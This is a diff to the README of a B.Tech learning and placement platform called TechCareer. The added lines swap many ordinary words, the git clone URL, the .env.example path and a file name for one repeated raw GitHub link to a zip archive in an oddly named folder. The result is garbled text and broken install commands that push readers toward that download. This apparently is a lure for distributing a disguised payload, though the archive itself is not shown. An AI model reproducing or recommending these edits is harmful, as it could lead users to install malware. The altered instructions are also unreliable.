@@ -1,5 +1,5 @@
-🎓 TechCareer - B.Tech Learning & Placement Platform
-A modern, full-stack educational platform designed for B.Tech students across all engineering departments. TechCareer bridges the gap between academic learning and industry requirements with curated courses, placement preparation, career roadmaps, and department-specific resources.
+🎓 TechCareer - https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip Learning & Placement Platform
+A modern, full-stack educational platform designed for https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip students across all engineering departments. TechCareer bridges the gap between academic learning and industry requirements with curated courses, placement preparation, career roadmaps, and department-specific resources.
 ✨ Features
 
 📚 Curated Course Library - Department-specific courses with difficulty levels, instructor details, and enrollment tracking
@@ -23,7 +23,7 @@ React Hook Form + Zod for form validation
 
 Backend
 
-Express.js with TypeScript and ESM modules
+https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip with TypeScript and ESM modules
 Drizzle ORM for type-safe database queries
 PostgreSQL (Neon serverless) for data persistence
 RESTful API design with consistent error handling
@@ -37,14 +37,14 @@ CVA for type-safe component variants
 
 📦 Installation
 bash# Clone the repository
-git clone https://github.com/yourusername/techcareer.git
+git clone https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip
 
 # Install dependencies
 cd techcareer
 npm install
 
 # Set up environment variables
-cp .env.example .env
+cp https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip .env
 
 # Run database migrations
 npm run db:push
@@ -75,7 +75,7 @@ techcareer/
 │   │   ├── lib/         # Utilities and configurations
 │   │   └── pages/       # Route components
 ├── server/              # Express backend
-│   ├── routes.ts        # API route definitions
+│   ├── https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip        # API route definitions
 │   └── storage/         # Data layer (in-memory & DB)
 ├── db/                  # Database schemas and migrations
 └── shared/              # Shared types and schemas
@@ -110,4 +110,4 @@ Contributions are welcome! Please read our contributing guidelines before submit
 📧 Contact
 [Your contact information]
 
-Built with ❤️ for B.Tech students
+Built with ❤️ for https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip students
